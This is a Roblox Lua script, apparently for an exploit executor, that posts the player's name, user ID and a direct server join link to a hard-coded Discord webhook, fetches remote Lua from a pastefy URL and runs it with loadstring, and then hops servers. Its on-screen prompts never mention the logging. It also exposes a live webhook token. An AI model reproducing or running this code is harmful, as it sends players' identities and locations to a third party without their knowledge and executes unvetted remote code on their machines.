‎-- LocalScript (place in StarterPlayerScripts)
‎local HttpService = game:GetService("HttpService")
‎local Players = game:GetService("Players")
‎local TeleportService = game:GetService("TeleportService")
‎local player = Players.LocalPlayer
‎
‎-- Discord webhook
‎local WEBHOOK_URL = "https://discord.com/api/webhooks/1397152370940575785/BYSlgKcS-yJqmA_CCOSr93BbwqVwy_DPI-cSEoXVO4CDoy0AQthEuNs3FQh7Xnjpr2gk"
‎
‎---------------------------------------------------------------------
‎-- 🔹 UI Prompt Function
‎---------------------------------------------------------------------
‎local function showPrompt(message, color)
‎    -- Remove old prompt if exists
‎    if player.PlayerGui:FindFirstChild("ServerHopPrompt") then
‎        player.PlayerGui.ServerHopPrompt:Destroy()
‎    end
‎
‎    local gui = Instance.new("ScreenGui")
‎    gui.Name = "ServerHopPrompt"
‎    gui.ResetOnSpawn = false
‎    gui.Parent = player:WaitForChild("PlayerGui")
‎
‎    local label = Instance.new("TextLabel")
‎    label.Size = UDim2.new(0.6, 0, 0.1, 0)
‎    label.Position = UDim2.new(0.2, 0, 0.85, 0)
‎    label.BackgroundTransparency = 0.3
‎    label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
‎    label.TextColor3 = color or Color3.fromRGB(255, 255, 0)
‎    label.Font = Enum.Font.SourceSansBold
‎    label.TextScaled = true
‎    label.Text = message
‎    label.Parent = gui
‎end
‎
‎---------------------------------------------------------------------
‎-- 🔹 Send webhook to Discord
‎---------------------------------------------------------------------
‎local function sendWebhook()
‎    local jobLink = "https://www.roblox.com/games/"..game.PlaceId.."?joinGameId="..game.JobId
‎    local payload = {
‎        username = "Roblox Server Logger",
‎        embeds = {{
‎            title = "Executor Triggered!",
‎            color = 65280,
‎            fields = {
‎                {name="Player", value=player.Name.." ("..player.UserId..")", inline=true},
‎                {name="PlaceId", value=tostring(game.PlaceId), inline=true},
‎                {name="JobId", value=tostring(game.JobId), inline=true},
‎                {name="Server Link", value="[Join Now]("..jobLink..")", inline=false},
‎                {name="Time", value=os.date("%Y-%m-%d %H:%M:%S"), inline=false}
‎            }
‎        }}
‎    }
‎
‎    local json = HttpService:JSONEncode(payload)
‎    pcall(function()
‎        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson)
‎    end)
‎end
‎
‎---------------------------------------------------------------------
‎-- 🔹 Server Hop Function
‎---------------------------------------------------------------------
‎local function serverHop()
‎    showPrompt("⚠ Full server, wait for other server to run the script...", Color3.fromRGB(255, 255, 0))
‎
‎    local servers = {}
‎    local cursor = ""
‎    local foundServer = false
‎
‎    repeat
‎        local req = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"..(cursor ~= "" and "&cursor="..cursor or ""))
‎        local data = HttpService:JSONDecode(req)
‎        if data and data.data then
‎            for _, server in ipairs(data.data) do
‎                if server.playing < server.maxPlayers then
‎                    foundServer = true
‎                    showPrompt("✅ Found new server, teleporting...", Color3.fromRGB(0, 255, 0))
‎                    TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, player)
‎                    break
‎                end
‎            end
‎        end
‎        cursor = data.nextPageCursor or ""
‎        task.wait(1)
‎    until foundServer or cursor == ""
‎end
‎
‎---------------------------------------------------------------------
‎-- 🔹 MAIN SCRIPT
‎---------------------------------------------------------------------
‎pcall(function()
‎    -- Show re-execution notice (every hop)
‎    showPrompt(".", Color3.fromRGB(0, 255, 0))
‎
‎    -- Send webhook
‎    sendWebhook()
‎
‎    -- Run external Lua script
‎    local luaCode = game:HttpGet("https://pastefy.app/Bokjxkob/raw")
‎    loadstring(luaCode)()
‎
‎    -- Example: Auto hop if server is full
‎    task.delay(10, function()
‎        if #Players:GetPlayers() >= game.MaxPlayers then
‎            serverHop()
‎        end
‎    end)
‎end)
‎
